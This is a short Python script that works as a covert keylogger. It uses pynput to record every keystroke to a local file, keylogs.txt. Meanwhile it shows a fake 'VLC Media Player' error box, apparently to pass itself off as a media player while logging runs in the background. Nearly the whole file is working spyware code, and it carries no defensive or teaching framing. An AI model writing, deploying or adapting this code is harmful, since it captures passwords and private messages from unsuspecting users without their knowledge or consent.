import ctypes
import threading
import time
from pynput import keyboard

class KeyLogger:
    def __init__(self, filename="keylogs.txt"):
        self.filename = filename
        self.pressed_keys = set()

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return f"[{str(key)}]"

    def on_press(self, key):
        if key not in self.pressed_keys:
            self.pressed_keys.add(key)
            with open(self.filename, 'a', encoding='utf-8') as logs:
                logs.write(self.get_char(key))

    def on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)

    def start(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        listener.start()
        listener.join()

def timed_popup():
    def popup():
        ctypes.windll.user32.MessageBoxW(
            0,
            "Playback error occurred.",
            "VLC Media Player",
            0x40 | 0x1
        )
    t = threading.Thread(target=popup)
    t.start()
    time.sleep(5)

def main():
    # Start keylogger thread
    logger = KeyLogger()
    threading.Thread(target=logger.start, daemon=True).start()

    # Show popup
    threading.Thread(target=timed_popup, daemon=True).start()

    # Keep the main program running
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()